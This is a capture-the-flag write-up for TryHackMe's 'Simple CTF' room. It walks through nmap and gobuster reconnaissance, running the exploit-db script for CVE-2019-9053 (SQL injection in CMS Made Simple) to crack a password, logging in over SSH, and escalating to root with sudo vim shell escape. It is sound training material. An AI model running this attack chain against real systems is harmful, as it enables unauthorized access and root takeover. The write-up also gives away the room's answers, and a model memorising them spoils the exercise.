# [Simple CTF](https://tryhackme.com/room/easyctf)

## Deploy the machine and attempt the questions!

### How many services are running under port 1000?

### What is running on the higher port?

1. Running an nmap scan revealed two services running under port 1000. The scan also showed that SSH is running on a higher port

```Bash
nmap -sV <IP>
```

![SCREEN01](https://github.com/user-attachments/assets/52add270-a336-46d6-bd6d-01afb67d8bae)

### What's the CVE you're using against the application?

### To what kind of vulnerability is the application vulnerable?

1. Scanning with gobuster reveals the `/simple` endpoint, at the bottom of which we find `CMS Made Simple version 2.2.8`. A quick google search reveals CVE-2019-9053 exploit - SQL (sqli) Injection

```
gobuster dir -u http://<IP>:80 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
```

![SCREEN02](https://github.com/user-attachments/assets/f55fbc6a-353b-4c53-ba90-3d20cb0a5a8f)
![SCREEN03](https://github.com/user-attachments/assets/45b0d3d3-16f9-4e28-92ae-6a6ade1b1f1b)

### What's the password?

1. Let's use the python script from [exploit-db](https://www.exploit-db.com/exploits/46635)

```Bash
python 46635.py -u http://<IP>:80/simple --crack -w /root/Desktop/Tools/wordlists/rockyou.txt
```

![SCREEN04](https://github.com/user-attachments/assets/028ca143-23a5-4e77-9310-2321e768811c)

### Where can you login with the details obtained

1. Looking back at the nmap results we can assume it is ssh

```Bash
ssh mitch@<IP>
python -c 'import pty; pty.spawn("/bin/bash")'
```

### What's the user flag?

1. The flag is right there in our starting directory

```Bash
cat user.txt
```

![SCREEN05](https://github.com/user-attachments/assets/080fb884-4fbd-42c5-bb78-d0e88a96af6c)

### Is there any other user in the home directory? What's its name?

1. Check the `/home` directory

```Bash
ls /home
```

![SCREEN06](https://github.com/user-attachments/assets/6a944ba7-b315-43e0-ae56-016226330f1a)

### What can you leverage to spawn a privileged shell?

1. Let's check what commands we can run with sudo privileges

```Bash
sudo -l
```

![SCREEN07](https://github.com/user-attachments/assets/2ef77377-6154-49c8-8714-90a9e454cdb1)

### What's the root flag?

1. Check [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) for vim, and use the first command with sudo

```Bash
sudo vim -c ':!/bin/sh'
cat root/root.txt
```

![SCREEN08](https://github.com/user-attachments/assets/b8067291-6154-4a78-8d94-a1a0e9a93ace)
